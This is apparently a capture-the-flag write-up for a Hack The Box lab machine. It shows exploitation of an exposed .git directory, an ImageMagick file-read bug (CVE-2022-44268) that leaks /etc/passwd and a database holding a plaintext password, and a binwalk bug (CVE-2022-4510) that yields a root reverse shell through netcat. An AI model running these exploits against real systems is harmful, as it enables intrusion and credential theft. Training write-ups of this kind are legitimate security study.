# easy - pilgrimage

Machine: pilgrimage.htb

## User flag

Basic nmap scanning:
```bash
~z➤ sudo nmap -n -Pn -sV -O -T4 pilgrimage.htb
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    nginx 1.18.0
```

We can notice it is a simple web page, let's see the html content:

```bash
~z➤ curl -s http://pilgrimage.htb/ | ag href | ag -v assets
...
                    <a href="/" class="logo">
                        <li><a href="/" class="active">Home</a></li>
                        <li><a href="login.php">Login</a></li>
                        <li><a href="register.php">Register</a></li>
                        <li><a href="dashboard.php">Dashboard</a></li>
                        <li><a href="logout.php">Logout</a></li>
...
```

So the site is hosting a PHP website

{{< limg "/i/2023-07-19_18-58.png" "Image shrinker PHP page">}}

So after testing the app, it gave me a download url  http://pilgrimage.htb/shrunk/64b86aa39ecce.jpeg I tried to read the metadata with `identify` and `exiftool`.

Here I'm running a more agresive scan on the port 80, see what we can find!:
```bash
~z➤ sudo nmap -p 80 -A -T4 10.10.11.219
...
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: Pilgrimage - Shrink Your Images
| http-git:
|   10.10.11.219:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Pilgrimage image shrinking service initial commit. # Please ...
|_http-server-header: nginx/1.18.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 5.0 (96%), Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
...
```

I've found this tool `git-dumper` that dumps a git repository from a website:
```bash
~z➤ git-dumper http://pilgrimage.htb/.git/ git
...
[-] Fetching http://pilgrimage.htb/.git/objects/fb/f9e44d80c149c822db0b575dbfdc4625744aa4 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/23/1150acdd01bbbef94dfb9da9f79476bfbb16fc [200]
[-] Fetching http://pilgrimage.htb/.git/objects/ca/d9dfca08306027b234ddc2166c838de9301487 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/f1/8fa9173e9f7c1b2f30f3d20c4a303e18d88548 [200]
[-] Running git checkout .

~z➤ ls
assets  dashboard.php  index.php  login.php  logout.php  magick  register.php  vendor

~z➤ file *
assets:        directory
dashboard.php: PHP script, Unicode text, UTF-8 text, with CRLF line terminators
index.php:     PHP script, Unicode text, UTF-8 text, with CRLF line terminators
login.php:     PHP script, Unicode text, UTF-8 text, with CRLF line terminators
logout.php:    PHP script, ASCII text, with CRLF line terminators
magick:        ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9fdbc145689e0fb79cb7291203431012ae8e1911, stripped
register.php:  PHP script, Unicode text, UTF-8 text, with CRLF line terminators
vendor:        directory
```

So we can see here how that bin file magick is being used:
```bash
~z➤ ag magick
index.php
27:      exec("/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/" . $upload->getName() . $mime . " -resize 50% /var/www/pilgrimage.htb/shrunk/" . $newname . $mime);
```

Let's now find some exploits for this:
```bash
~z➤ ./magick -version
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
```

Found this:
- https://www.exploit-db.com/exploits/51261
- https://github.com/voidz0r/CVE-2022-44268
- https://github.com/Sybil-Scan/imagemagick-lfi-poc

I've picked up the CVE-2022-44268 repo:
```bash
~z/CVE-2022-44268➤ cargo run "/etc/passwd"
...
  Downloaded cfg-if v1.0.0
  Downloaded 8 crates (301.4 KB) in 1.16s
   Compiling crc32fast v1.3.2
     ...
   Compiling cve-2022-44268 v0.1.0 (/home/n0kt/blog/content/infosec/htb/p8/pilgrimage/CVE-2022-44268)
    Finished dev [unoptimized + debuginfo] target(s) in 4.42s
     Running `target/debug/cve-2022-44268 /etc/passwd`
```

Now uploading the resultant image.png to the webpage, get the shrinked image and check the metadata:
```bash
~z/CVE-2022-44268➤ wget http://pilgrimage.htb/shrunk/64b874aa305d1.png
...
Saving to: ‘64b874aa305d1.png’
1.-07-19 19:40:28 (47.0 MB/s) - ‘64b874aa305d1.png’ saved [1080/1080]

~z/CVE-2022-44268➤ identify -verbose 64b874aa305d1.png
...
    png:IHDR.interlace_method: 0 (Not interlaced)
    png:IHDR.width,height: 100, 100
    png:PLTE.number_colors: 2
    png:text: 4 tEXt/zTXt/iTXt chunks were found
    png:tIME: 2023-07-19T23:41:30Z
    Raw profile type:

    1437
726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d
6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f
6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e
2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f736269
6e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f
62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d
65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a
2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a
783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f
6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f757372
2f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73
706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31
303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f
6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573
722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d
646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b
75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f
7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c69
7374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67
696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f73
62696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d
5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e
6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a3635353334
3a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e
2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374
656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f72
6b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d65
6e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e
0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d642052
65736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f
6c6f67696e0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e65786973
74656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573
796e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e69
7a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c
6f67696e0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d
652f656d696c793a2f62696e2f626173680a73797374656d642d636f726564756d703a78
3a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f
7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f
737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a393938
3a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a

    ...
  Pixels per second: 17.2051MP
  User time: 0.000u
  Elapsed time: 0:01.000
  Version: ImageMagick 7.1.1-13 Q16-HDRI x86_64 21276 https://imagemagick.org
```

Decoding it from hexadecimal:
```python
>> ...
a2f3a2f7573722f7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a3939383a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a"

>> bytes.fromhex(hex).decode("utf-8")
'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:109::/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nemily:x:1000:1000:emily,,,:/home/emily:/bin/bash\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nsshd:x:105:65534::/run/sshd:/usr/sbin/nologin\n_laurel:x:998:998::/var/log/laurel:/bin/false\n'
```

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
emily:x:1000:1000:emily,,,:/home/emily:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```

In a simple glance, we can see user `emily`.

After reviewing a little bit all php files, I found a database file.
```bash
➤ ag var *.php
dashboard.php:14:  $db = new PDO('sqlite:/var/db/pilgrimage');
dashboard.php:151:    var imageTable = "<table id=\"customers\"><tr><th>Original Image Name</th><th>Shrunken Image URL</th></tr>"
index.php:16:    $image->setLocation("/var/www/pilgrimage.htb/tmp");
index.php:27:      exec("/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/" . $upload->getName() . $mime . " -resize 50% /var/www/pilgrimage.htb/shrunk/" . $newname . $mime);
index.php:31:        $db = new PDO('sqlite:/var/db/pilgrimage');
login.php:12:  $db = new PDO('sqlite:/var/db/pilgrimage');
register.php:12:  $db = new PDO('sqlite:/var/db/pilgrimage');
```

So let's use the imagemagick exploit, let's generate an image and shrink it the web app and review the resultant image's metadata in order to get the database content:
```bash
➤ sqlite3 download.sqlite
SQLite version 3.42.0 2023-05-16 12:36:15
Enter ".help" for usage hints.
sqlite> .tables
images  users
sqlite> select * from users;
emily|abigchonkyboi123
```

And the credentials worked for emily's SSH:
```bash
emily@pilgrimage:~$ id
uid=1000(emily) gid=1000(emily) groups=1000(emily)
```

## Root flag

After getting `pspy64` I got this:

```bash
...
s2023/07/20 09:58:30 CMD: UID=0     PID=743    | /lib/systemd/systemd-logind
1./07/20 09:58:30 CMD: UID=0     PID=739    | /bin/bash /usr/sbin/malwarescan.sh
2./07/20 09:58:30 CMD: UID=0     PID=738    | /usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/
3./07/20 09:58:30 CMD: UID=0     PID=724    | /bin/bash /usr/sbin/malwarescan.sh
...

emily@pilgrimage:~$ cat /usr/sbin/malwarescan.sh
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
        binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
                if [[ "$binout" == *"$banned"* ]]; then
                        /usr/bin/rm "$filename"
                        break
                fi
        done
done
```

That is using binwalk v2.3.2, here is a vuln for it: https://www.exploit-db.com/exploits/51249

```bash
➤ python exploit.py any_image_here.jpeg $YOUR_IP 9999
...
------------------CVE-2022-4510----------------
################################################
--------Binwalk Remote Command Execution--------
------Binwalk 2.1.2b through 2.3.2 included-----
...
You can now rename and share binwalk_exploit and start your local netcat listener.


➤ scp binwalk_exploit.png emily@pilgrimage.htb:~/
binwalk_exploit.png                                               100% 4200    26.8KB/s   00:00
```

From the app server:
```bash
emily@pilgrimage:~$ cp binwalk_exploit.png /var/www/pilgrimage.htb/shrunk/foo.png
```
Opening a port for reverse shell connection:
```bash
➤ nc -lvnp 9999
Connection from 10.10.11.219:41146
id
uid=0(root) gid=0(root) groups=0(root)
cd /root
cat root.txt
XXXXXXXXXXXX
```
And we are done now.

## TODOs

- Learn how to dump an hex string into a bin file
- Learn how to use pspy64
